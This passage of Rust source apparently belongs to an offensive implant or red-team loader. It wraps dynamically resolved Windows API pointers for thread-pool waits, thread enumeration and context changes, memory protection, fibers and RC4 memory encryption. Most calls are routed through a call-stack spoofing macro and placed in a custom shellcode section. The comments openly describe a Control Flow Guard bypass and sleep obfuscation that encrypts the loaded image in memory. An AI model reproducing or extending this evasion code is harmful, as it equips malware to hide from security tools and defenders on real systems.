    /// * `Callback` - Pointer to the callback function invoked when the wait is satisfied.
    /// * `Context` - Pointer to application-defined data passed to the callback.
    /// * `CallbackEnviron` - Optional pointer to a `TP_CALLBACK_ENVIRON_V3` for pool/group binding.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn TpAllocWait(
        &mut self,
        Wait: *mut PVOID,
        Callback: PVOID,
        Context: PVOID,
        CallbackEnviron: *mut TP_CALLBACK_ENVIRON_V3,
    ) -> NTSTATUS {
        let f: FnTpAllocWait = transmute(self.TpAllocWait_ptr);

        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            Wait,
            Callback,
            Context,
            CallbackEnviron,
        ) as NTSTATUS;

        #[cfg(not(feature = "spoof-uwd"))]
        f(Wait as _, transmute(Callback), Context, CallbackEnviron)
    }

    /// Arm a thread pool wait with an event handle and timeout.
    ///
    /// # Arguments
    ///
    /// * `Wait` - Pointer to the wait object to arm.
    /// * `Handle` - Handle to the kernel object to wait on.
    /// * `Timeout` - Optional pointer to a timeout value (negative for relative, positive for absolute).
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn TpSetWait(
        &mut self,
        Wait: PVOID,
        Handle: HANDLE,
        Timeout: PLARGE_INTEGER,
    ) -> NTSTATUS {
        let f: FnTpSetWait = transmute(self.TpSetWait_ptr);

        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            Wait,
            Handle,
            Timeout,
        ) as NTSTATUS;

        #[cfg(not(feature = "spoof-uwd"))]
        {
            f(Wait as _, Handle, Timeout);
            STATUS_SUCCESS
        }
    }
}

/// Resolved function pointers from `kernel32.dll`.
///
/// Provides Win32 wrappers for library loading, synchronization, thread/process info,
/// virtual memory, fiber operations, and thread pool management.
pub struct Kernel32Module {
    pub handle: usize,
    pub size: u32,
    #[cfg(feature = "spoof-uwd")]
    pub spoof_config: crate::spoof::uwd::types::Config,
    pub LoadLibraryA_ptr: *mut FnLoadLibraryA,
    pub LoadLibraryExA_ptr: *mut FnLoadLibraryExA,
    pub GetProcAddress_ptr: *mut FnGetProcAddress,
    pub WaitForSingleObject_ptr: *mut FnWaitForSingleObject,
    pub WaitForSingleObjectEx_ptr: *mut FnWaitForSingleObjectEx,
    pub Sleep_ptr: *mut FnSleep,
    pub CreateToolhelp32Snapshot_ptr: *mut FnCreateToolhelp32Snapshot,
    pub Thread32First_ptr: *mut FnThread32First,
    pub Thread32Next_ptr: *mut FnThread32Next,
    pub OpenThread_ptr: *mut FnOpenThread,
    pub DuplicateHandle_ptr: *mut FnDuplicateHandle,
    pub GetThreadContext_ptr: *mut FnGetThreadContext,
    pub SetThreadContext_ptr: *mut FnSetThreadContext,
    pub SetEvent_ptr: *mut FnSetEvent,
    pub VirtualProtect_ptr: *mut FnVirtualProtect,
    pub VirtualAlloc_ptr: *mut FnVirtualAlloc,
    pub VirtualFree_ptr: *mut FnVirtualFree,
    pub GetCurrentProcess_ptr: *mut FnGetCurrentProcess,
    pub GetCurrentProcessId_ptr: *mut FnGetCurrentProcessId,
    pub GetCurrentThreadId_ptr: *mut FnGetCurrentThreadId,
    pub BaseThreadInitThunk_ptr: *mut FnBaseThreadInitThunk,
    pub EnumDateFormatsExA_ptr: *mut FnEnumDateFormatsExA,
    pub ConvertThreadToFiber_ptr: *mut FnConvertThreadToFiber,
    pub ConvertFiberToThread_ptr: *mut FnConvertFiberToThread,
    pub CreateFiber_ptr: *mut FnCreateFiber,
    pub DeleteFiber_ptr: *mut FnDeleteFiber,
    pub SwitchToFiber_ptr: *mut FnSwitchToFiber,
    pub CloseThreadpool_ptr: *mut FnCloseThreadpool,
    pub DisableThreadLibraryCalls_ptr: *mut FnDisableThreadLibraryCalls,
}

/// Resolved function pointers from `kernelbase.dll`.
///
/// Currently only wraps `SetProcessValidCallTargets` for CFG (Control Flow Guard) bypass.
pub struct KernelBaseModule {
    pub handle: usize,
    pub size: u32,
    #[cfg(feature = "spoof-uwd")]
    pub spoof_config: crate::spoof::uwd::types::Config,
    pub SetProcessValidCallTargets_ptr: *mut FnSetProcessValidCallTargets,
}

/// Resolved function pointers from `advapi32.dll`.
///
/// Provides access to undocumented `SystemFunction032/040/041` (RC4 encryption primitives
/// used by DPAPI) for in-place image encryption during sleep obfuscation.
pub struct AdvapiModule {
    pub handle: usize,
    pub size: u32,
    pub SystemFunction032_ptr: *mut FnSystemFunction032,
    pub SystemFunction040_ptr: *mut FnSystemFunction040,
    pub SystemFunction041_ptr: *mut FnSystemFunction041,
    pub enckey: [u8; KEY_SIZE],
}

impl Kernel32Module {
    // ── Library Loading ─────────────────────────────────────────────

    /// Load a DLL by ASCII name.
    ///
    /// # Arguments
    ///
    /// * `lpLibFileName` - Pointer to a null-terminated ANSI string specifying the DLL file name.
    ///
    /// # Returns
    ///
    /// Handle to the loaded module on success, or null on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn LoadLibraryA(&mut self, lpLibFileName: PSTR) -> HMODULE {
        let f: FnLoadLibraryA = transmute(self.LoadLibraryA_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            lpLibFileName
        ) as HMODULE;
        #[cfg(not(feature = "spoof-uwd"))]
        f(lpLibFileName)
    }

    /// Load a DLL by ASCII name with flags.
    ///
    /// # Arguments
    ///
    /// * `lpLibFileName` - Pointer to a null-terminated ANSI string specifying the DLL file name.
    /// * `hFile` - Reserved; must be null.
    /// * `dwFlags` - Action to take when loading the module (e.g., `LOAD_LIBRARY_AS_DATAFILE`).
    ///
    /// # Returns
    ///
    /// Handle to the loaded module on success, or null on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn LoadLibraryExA(
        &mut self,
        lpLibFileName: LPCSTR,
        hFile: HANDLE,
        dwFlags: DWORD,
    ) -> HMODULE {
        let f: FnLoadLibraryExA = transmute(self.LoadLibraryExA_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            lpLibFileName,
            hFile,
            dwFlags as usize
        ) as HMODULE;
        #[cfg(not(feature = "spoof-uwd"))]
        f(lpLibFileName, hFile, dwFlags)
    }

    /// Retrieve the address of an exported function by name.
    ///
    /// # Arguments
    ///
    /// * `hModule` - Handle to the DLL module containing the function.
    /// * `lpProcName` - Pointer to a null-terminated ANSI string specifying the function name.
    ///
    /// # Returns
    ///
    /// Pointer to the exported function, or null if not found.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn GetProcAddress(&mut self, hModule: HMODULE, lpProcName: PSTR) -> PVOID {
        let f: FnGetProcAddress = transmute(self.GetProcAddress_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            hModule as usize,
            lpProcName
        ) as PVOID;
        #[cfg(not(feature = "spoof-uwd"))]
        f(hModule, lpProcName)
    }

    // ── Synchronization ───────────────────────────────────────────────

    /// Wait for a kernel object to become signaled.
    ///
    /// # Arguments
    ///
    /// * `hHandle` - Handle to the object to wait on.
    /// * `dwMilliseconds` - Timeout interval in milliseconds (`INFINITE` for no timeout).
    ///
    /// # Returns
    ///
    /// `DWORD` wait result: `WAIT_OBJECT_0` if signaled, `WAIT_TIMEOUT` on timeout, or `WAIT_FAILED` on error.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn WaitForSingleObject(&mut self, hHandle: HANDLE, dwMilliseconds: DWORD) -> DWORD {
        let f: FnWaitForSingleObject = transmute(self.WaitForSingleObject_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            hHandle,
            dwMilliseconds as usize
        ) as DWORD;
        #[cfg(not(feature = "spoof-uwd"))]
        f(hHandle, dwMilliseconds)
    }

    /// Wait for a kernel object with alertable option.
    ///
    /// # Arguments
    ///
    /// * `hHandle` - Handle to the object to wait on.
    /// * `dwMilliseconds` - Timeout interval in milliseconds (`INFINITE` for no timeout).
    /// * `bAlertable` - If `TRUE`, the wait is alertable (APCs and I/O completion routines can interrupt it).
    ///
    /// # Returns
    ///
    /// `DWORD` wait result: `WAIT_OBJECT_0` if signaled, `WAIT_TIMEOUT` on timeout, `WAIT_IO_COMPLETION` if interrupted by APC, or `WAIT_FAILED` on error.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn WaitForSingleObjectEx(
        &mut self,
        hHandle: HANDLE,
        dwMilliseconds: DWORD,
        bAlertable: BOOL,
    ) -> DWORD {
        let f: FnWaitForSingleObjectEx = transmute(self.WaitForSingleObjectEx_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            hHandle,
            dwMilliseconds as usize,
            bAlertable as usize
        ) as DWORD;
        #[cfg(not(feature = "spoof-uwd"))]
        f(hHandle, dwMilliseconds, bAlertable)
    }

    /// Suspend the calling thread for the specified duration.
    ///
    /// # Arguments
    ///
    /// * `dwMilliseconds` - Time to sleep in milliseconds.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn Sleep(&mut self, dwMilliseconds: DWORD) {
        let f: FnSleep = transmute(self.Sleep_ptr);
        #[cfg(feature = "spoof-uwd")]
        {
            crate::spoof_uwd!(
                &self.spoof_config,
                f as *const core::ffi::c_void,
                dwMilliseconds as usize
            );
            return;
        }
        #[cfg(not(feature = "spoof-uwd"))]
        f(dwMilliseconds)
    }

    // ── Thread Enumeration ────────────────────────────────────────────

    /// Create a snapshot of processes/threads for enumeration.
    ///
    /// # Arguments
    ///
    /// * `dwFlags` - Portions of the system to include in the snapshot (e.g., `TH32CS_SNAPTHREAD`).
    /// * `th32ProcessID` - Process identifier to snapshot, or 0 for the current process.
    ///
    /// # Returns
    ///
    /// Valid snapshot handle on success, or `INVALID_HANDLE_VALUE` on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn CreateToolhelp32Snapshot(&mut self, dwFlags: u32, th32ProcessID: u32) -> HANDLE {
        let f: FnCreateToolhelp32Snapshot = transmute(self.CreateToolhelp32Snapshot_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            dwFlags as usize,
            th32ProcessID as usize
        ) as HANDLE;
        #[cfg(not(feature = "spoof-uwd"))]
        f(dwFlags, th32ProcessID)
    }

    /// Retrieve the first thread entry from a snapshot.
    ///
    /// # Arguments
    ///
    /// * `hSnapshot` - Handle to the snapshot returned by `CreateToolhelp32Snapshot`.
    /// * `lpte` - Pointer to a `THREADENTRY32` structure that receives the first thread entry.
    ///
    /// # Returns
    ///
    /// Nonzero (`TRUE`) on success, 0 (`FALSE`) on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn Thread32First(&mut self, hSnapshot: HANDLE, lpte: *mut THREADENTRY32) -> BOOL {
        let f: FnThread32First = transmute(self.Thread32First_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            hSnapshot,
            lpte
        ) as BOOL;
        #[cfg(not(feature = "spoof-uwd"))]
        f(hSnapshot, lpte)
    }

    /// Retrieve the next thread entry from a snapshot.
    ///
    /// # Arguments
    ///
    /// * `hSnapshot` - Handle to the snapshot returned by `CreateToolhelp32Snapshot`.
    /// * `lpte` - Pointer to a `THREADENTRY32` structure that receives the next thread entry.
    ///
    /// # Returns
    ///
    /// Nonzero (`TRUE`) on success, 0 (`FALSE`) on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn Thread32Next(&mut self, hSnapshot: HANDLE, lpte: *mut THREADENTRY32) -> BOOL {
        let f: FnThread32Next = transmute(self.Thread32Next_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            hSnapshot,
            lpte
        ) as BOOL;
        #[cfg(not(feature = "spoof-uwd"))]
        f(hSnapshot, lpte)
    }

    /// Open a handle to an existing thread by ID.
    ///
    /// # Arguments
    ///
    /// * `dwDesiredAccess` - Access rights for the thread handle.
    /// * `bInheritHandle` - If `TRUE`, processes created by this process inherit the handle.
    /// * `dwThreadId` - Identifier of the thread to open.
    ///
    /// # Returns
    ///
    /// Valid thread handle on success, or null on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn OpenThread(
        &mut self,
        dwDesiredAccess: u32,
        bInheritHandle: BOOL,
        dwThreadId: u32,
    ) -> HANDLE {
        let f: FnOpenThread = transmute(self.OpenThread_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            dwDesiredAccess as usize,
            bInheritHandle as usize,
            dwThreadId as usize
        ) as HANDLE;
        #[cfg(not(feature = "spoof-uwd"))]
        f(dwDesiredAccess, bInheritHandle, dwThreadId)
    }

    // ── Handle Duplication ────────────────────────────────────────────

    /// Duplicate an object handle.
    ///
    /// # Arguments
    ///
    /// * `hSourceProcessHandle` - Handle to the process that owns the source handle.
    /// * `hSourceHandle` - Handle to duplicate.
    /// * `hTargetProcessHandle` - Handle to the process that receives the duplicated handle.
    /// * `lpTargetHandle` - Pointer to a variable that receives the duplicated handle.
    /// * `dwDesiredAccess` - Access rights for the new handle.
    /// * `bInheritHandle` - If `TRUE`, the new handle is inheritable.
    /// * `dwOptions` - Duplication options (e.g., `DUPLICATE_SAME_ACCESS`, `DUPLICATE_CLOSE_SOURCE`).
    ///
    /// # Returns
    ///
    /// Nonzero (`TRUE`) on success, 0 (`FALSE`) on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn DuplicateHandle(
        &mut self,
        hSourceProcessHandle: HANDLE,
        hSourceHandle: HANDLE,
        hTargetProcessHandle: HANDLE,
        lpTargetHandle: *mut HANDLE,
        dwDesiredAccess: u32,
        bInheritHandle: BOOL,
        dwOptions: u32,
    ) -> BOOL {
        let f: FnDuplicateHandle = transmute(self.DuplicateHandle_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            hSourceProcessHandle,
            hSourceHandle,
            hTargetProcessHandle,
            lpTargetHandle,
            dwDesiredAccess as usize,
            bInheritHandle as usize,
            dwOptions as usize
        ) as BOOL;
        #[cfg(not(feature = "spoof-uwd"))]
        f(
            hSourceProcessHandle,
            hSourceHandle,
            hTargetProcessHandle,
            lpTargetHandle,
            dwDesiredAccess,
            bInheritHandle,
            dwOptions,
        )
    }

    // ── Thread Context ────────────────────────────────────────────────

    /// Retrieve the context of a thread (Win32 wrapper).
    ///
    /// # Arguments
    ///
    /// * `hThread` - Handle to the thread whose context is to be retrieved.
    /// * `lpContext` - Pointer to a `CONTEXT` structure that receives the thread context.
    ///
    /// # Returns
    ///
    /// Nonzero (`TRUE`) on success, 0 (`FALSE`) on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn GetThreadContext(&mut self, hThread: HANDLE, lpContext: PCONTEXT) -> BOOL {
        let f: FnGetThreadContext = transmute(self.GetThreadContext_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            hThread,
            lpContext
        ) as BOOL;
        #[cfg(not(feature = "spoof-uwd"))]
        f(hThread, lpContext)
    }

    /// Set the context of a thread (Win32 wrapper).
    ///
    /// # Arguments
    ///
    /// * `hThread` - Handle to the thread whose context is to be set.
    /// * `lpContext` - Pointer to a `CONTEXT` structure containing the new thread context.
    ///
    /// # Returns
    ///
    /// Nonzero (`TRUE`) on success, 0 (`FALSE`) on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn SetThreadContext(&mut self, hThread: HANDLE, lpContext: PCONTEXT) -> BOOL {
        let f: FnSetThreadContext = transmute(self.SetThreadContext_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            hThread,
            lpContext
        ) as BOOL;
        #[cfg(not(feature = "spoof-uwd"))]
        f(hThread, lpContext)
    }

    // ── Events ───────────────────────────────────────────────────────

    /// Set an event object to the signaled state (Win32 wrapper).
    ///
    /// # Arguments
    ///
    /// * `hEvent` - Handle to the event object to signal.
    ///
    /// # Returns
    ///
    /// Nonzero (`TRUE`) on success, 0 (`FALSE`) on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn SetEvent(&mut self, hEvent: HANDLE) -> BOOL {
        let f: FnSetEvent = transmute(self.SetEvent_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(&self.spoof_config, f as *const core::ffi::c_void, hEvent)
            as BOOL;
        #[cfg(not(feature = "spoof-uwd"))]
        f(hEvent)
    }

    // ── Virtual Memory ────────────────────────────────────────────────

    /// Change the protection on a region of committed pages.
    ///
    /// # Arguments
    ///
    /// * `lpAddress` - Pointer to the base address of the region whose protection is to be changed.
    /// * `dwSize` - Size of the region, in bytes.
    /// * `flNewProtect` - New memory protection constant (e.g., `PAGE_EXECUTE_READ`).
    /// * `lpflOldProtect` - Pointer to a variable that receives the old protection value.
    ///
    /// # Returns
    ///
    /// Nonzero (`TRUE`) on success, 0 (`FALSE`) on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn VirtualProtect(
        &mut self,
        lpAddress: PVOID,
        dwSize: SIZE_T,
        flNewProtect: u32,
        lpflOldProtect: *mut u32,
    ) -> BOOL {
        let f: FnVirtualProtect = transmute(self.VirtualProtect_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            lpAddress,
            dwSize,
            flNewProtect as usize,
            lpflOldProtect
        ) as BOOL;
        #[cfg(not(feature = "spoof-uwd"))]
        f(lpAddress, dwSize, flNewProtect, lpflOldProtect)
    }

    /// Reserve or commit a region of virtual memory.
    ///
    /// # Arguments
    ///
    /// * `lpAddress` - Starting address of the region, or null to let the system choose.
    /// * `dwSize` - Size of the region, in bytes.
    /// * `flAllocationType` - Type of allocation (e.g., `MEM_COMMIT`, `MEM_RESERVE`).
    /// * `flProtect` - Memory protection for the region (e.g., `PAGE_READWRITE`).
    ///
    /// # Returns
    ///
    /// Pointer to the base address of the allocated region, or null on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn VirtualAlloc(
        &mut self,
        lpAddress: LPVOID,
        dwSize: SIZE_T,
        flAllocationType: DWORD,
        flProtect: DWORD,
    ) -> LPVOID {
        let f: FnVirtualAlloc = transmute(self.VirtualAlloc_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            lpAddress,
            dwSize,
            flAllocationType as usize,
            flProtect as usize
        ) as LPVOID;
        #[cfg(not(feature = "spoof-uwd"))]
        f(lpAddress, dwSize, flAllocationType, flProtect)
    }

    /// Release or decommit a region of virtual memory.
    ///
    /// # Arguments
    ///
    /// * `lpAddress` - Pointer to the base address of the region to free.
    /// * `dwSize` - Size of the region in bytes (0 when using `MEM_RELEASE`).
    /// * `dwFreeType` - Type of free operation (e.g., `MEM_RELEASE`, `MEM_DECOMMIT`).
    ///
    /// # Returns
    ///
    /// Nonzero (`TRUE`) on success, 0 (`FALSE`) on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn VirtualFree(
        &mut self,
        lpAddress: LPVOID,
        dwSize: SIZE_T,
        dwFreeType: DWORD,
    ) -> BOOL {
        let f: FnVirtualFree = transmute(self.VirtualFree_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            lpAddress,
            dwSize,
            dwFreeType as usize
        ) as BOOL;
        #[cfg(not(feature = "spoof-uwd"))]
        f(lpAddress, dwSize, dwFreeType)
    }

    // ── Process / Thread Info ────────────────────────────────────────

    /// Return a pseudo-handle to the current process.
    ///
    /// # Returns
    ///
    /// Pseudo-handle to the current process (always succeeds).
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn GetCurrentProcess(&mut self) -> HANDLE {
        let f: FnGetCurrentProcess = transmute(self.GetCurrentProcess_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(&self.spoof_config, f as *const core::ffi::c_void) as HANDLE;
        #[cfg(not(feature = "spoof-uwd"))]
        f()
    }

    /// Return the PID of the current process.
    ///
    /// # Returns
    ///
    /// The process identifier (PID) of the calling process.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn GetCurrentProcessId(&mut self) -> u32 {
        let f: FnGetCurrentProcessId = transmute(self.GetCurrentProcessId_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(&self.spoof_config, f as *const core::ffi::c_void) as usize
            as u32;
        #[cfg(not(feature = "spoof-uwd"))]
        f()
    }

    /// Return the TID of the current thread.
    ///
    /// # Returns
    ///
    /// The thread identifier (TID) of the calling thread.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn GetCurrentThreadId(&mut self) -> u32 {
        let f: FnGetCurrentThreadId = transmute(self.GetCurrentThreadId_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(&self.spoof_config, f as *const core::ffi::c_void) as usize
            as u32;
        #[cfg(not(feature = "spoof-uwd"))]
        f()
    }

    // ── Fiber Operations ──────────────────────────────────────────────

    /// Convert the current thread to a fiber.
    ///
    /// # Arguments
    ///
    /// * `lpParameter` - Pointer to application-defined data associated with the fiber.
    ///
    /// # Returns
    ///
    /// Pointer to the fiber context on success, or null on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn ConvertThreadToFiber(&mut self, lpParameter: PVOID) -> PVOID {
        let f: FnConvertThreadToFiber = transmute(self.ConvertThreadToFiber_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            lpParameter
        ) as PVOID;
        #[cfg(not(feature = "spoof-uwd"))]
        f(lpParameter)
    }

    /// Convert the current fiber back to a thread.
    ///
    /// # Returns
    ///
    /// Nonzero (`TRUE`) on success, 0 (`FALSE`) on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn ConvertFiberToThread(&mut self) -> BOOL {
        let f: FnConvertFiberToThread = transmute(self.ConvertFiberToThread_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(&self.spoof_config, f as *const core::ffi::c_void) as BOOL;
        #[cfg(not(feature = "spoof-uwd"))]
        f()
    }

    /// Create a new fiber with the specified stack size and entry point.
    ///
    /// # Arguments
    ///
    /// * `dwStackSize` - Initial stack size for the fiber, in bytes (0 for default).
    /// * `lpStartAddress` - Pointer to the fiber entry-point function.
    /// * `lpParameter` - Pointer to application-defined data passed to the fiber function.
    ///
    /// # Returns
    ///
    /// Pointer to the fiber context on success, or null on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn CreateFiber(
        &mut self,
        dwStackSize: SIZE_T,
        lpStartAddress: LPFIBER_START_ROUTINE,
        lpParameter: PVOID,
    ) -> PVOID {
        let f: FnCreateFiber = transmute(self.CreateFiber_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            dwStackSize,
            transmute::<_, *const core::ffi::c_void>(lpStartAddress),
            lpParameter
        ) as PVOID;
        #[cfg(not(feature = "spoof-uwd"))]
        f(dwStackSize, lpStartAddress, lpParameter)
    }

    /// Delete a fiber object.
    ///
    /// # Arguments
    ///
    /// * `lpFiber` - Pointer to the fiber to delete.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn DeleteFiber(&mut self, lpFiber: PVOID) {
        let f: FnDeleteFiber = transmute(self.DeleteFiber_ptr);
        #[cfg(feature = "spoof-uwd")]
        {
            crate::spoof_uwd!(&self.spoof_config, f as *const core::ffi::c_void, lpFiber);
            return;
        }
        #[cfg(not(feature = "spoof-uwd"))]
        f(lpFiber)
    }

    /// Switch execution to the specified fiber.
    ///
    /// # Arguments
    ///
    /// * `lpFiber` - Pointer to the fiber to switch to.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn SwitchToFiber(&mut self, lpFiber: PVOID) {
        let f: FnSwitchToFiber = transmute(self.SwitchToFiber_ptr);
        #[cfg(feature = "spoof-uwd")]
        {
            crate::spoof_uwd!(&self.spoof_config, f as *const core::ffi::c_void, lpFiber);
            return;
        }
        #[cfg(not(feature = "spoof-uwd"))]
        f(lpFiber)
    }

    // ── Thread Pool ──────────────────────────────────────────────────

    /// Close a thread pool.
    ///
    /// # Arguments
    ///
    /// * `Pool` - Pointer to the thread pool object to close.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn CloseThreadpool(&mut self, Pool: PVOID) {
        let f: FnCloseThreadpool = transmute(self.CloseThreadpool_ptr);
        #[cfg(feature = "spoof-uwd")]
        {
            crate::spoof_uwd!(&self.spoof_config, f as *const core::ffi::c_void, Pool);
            return;
        }
        #[cfg(not(feature = "spoof-uwd"))]
        f(Pool)
    }

    // ── DLL Notifications ────────────────────────────────────────────

    /// Disable DLL_THREAD_ATTACH/DETACH notifications.
    ///
    /// # Arguments
    ///
    /// * `hLibModule` - Handle to the DLL module for which to disable thread notifications.
    ///
    /// # Returns
    ///
    /// Nonzero (`TRUE`) on success, 0 (`FALSE`) on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn DisableThreadLibraryCalls(&mut self, hLibModule: PVOID) -> BOOL {
        let f: FnDisableThreadLibraryCalls = transmute(self.DisableThreadLibraryCalls_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            hLibModule
        ) as BOOL;
        #[cfg(not(feature = "spoof-uwd"))]
        f(hLibModule)
    }
}

impl KernelBaseModule {
    /// Mark addresses as valid CFG call targets.
    ///
    /// # Arguments
    ///
    /// * `hProcess` - Handle to the process whose CFG bitmap is to be modified.
    /// * `VirtualAddress` - Base address of the memory region containing the call targets.
    /// * `RegionSize` - Size of the memory region, in bytes.
    /// * `NumberOfOffsets` - Number of entries in the `OffsetInformation` array.
    /// * `OffsetInformation` - Pointer to an array of `CFG_CALL_TARGET_INFO` structures describing each target.
    ///
    /// # Returns
    ///
    /// Nonzero (`TRUE`) on success, 0 (`FALSE`) on failure.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn SetProcessValidCallTargets(
        &mut self,
        hProcess: HANDLE,
        VirtualAddress: PVOID,
        RegionSize: SIZE_T,
        NumberOfOffsets: ULONG,
        OffsetInformation: PCFG_CALL_TARGET_INFO,
    ) -> BOOL {
        let f: FnSetProcessValidCallTargets = transmute(self.SetProcessValidCallTargets_ptr);
        #[cfg(feature = "spoof-uwd")]
        return crate::spoof_uwd!(
            &self.spoof_config,
            f as *const core::ffi::c_void,
            hProcess,
            VirtualAddress,
            RegionSize,
            NumberOfOffsets as usize,
            OffsetInformation
        ) as BOOL;
        #[cfg(not(feature = "spoof-uwd"))]
        f(
            hProcess,
            VirtualAddress,
            RegionSize,
            NumberOfOffsets,
            OffsetInformation,
        )
    }
}

impl AdvapiModule {
    /// RC4 encrypt/decrypt a buffer with a key (symmetric -- same call encrypts and decrypts).
    ///
    /// # Arguments
    ///
    /// * `Data` - Pointer to a `USTRING` describing the buffer to encrypt or decrypt in-place.
    /// * `Key` - Pointer to a `USTRING` describing the RC4 key.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn SystemFunction032(&self, Data: PUSTRING, Key: PUSTRING) -> NTSTATUS {
        let f: FnSystemFunction032 = transmute(self.SystemFunction032_ptr);
        f(Data, Key)
    }

    /// Encrypt (RC4) a memory buffer in-place using DPAPI internals.
    ///
    /// # Arguments
    ///
    /// * `Memory` - Pointer to the memory buffer to encrypt in-place.
    /// * `MemorySize` - Size of the memory buffer, in bytes (must be a multiple of the block size).
    /// * `OptionFlags` - Encryption option flags.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn SystemFunction040(
        &self,
        Memory: PVOID,
        MemorySize: ULONG,
        OptionFlags: ULONG,
    ) -> NTSTATUS {
        let f: FnSystemFunction040 = transmute(self.SystemFunction040_ptr);
        f(Memory, MemorySize, OptionFlags)
    }

    /// Decrypt (RC4) a memory buffer in-place using DPAPI internals.
    ///
    /// # Arguments
    ///
    /// * `Memory` - Pointer to the memory buffer to decrypt in-place.
    /// * `MemorySize` - Size of the memory buffer, in bytes (must be a multiple of the block size).
    /// * `OptionFlags` - Decryption option flags.
    ///
    /// # Returns
    ///
    /// `NTSTATUS` -- `STATUS_SUCCESS` on success, or an appropriate NT error code.
    #[inline(always)]
    #[link_section = ".text$E"]
    pub unsafe fn SystemFunction041(
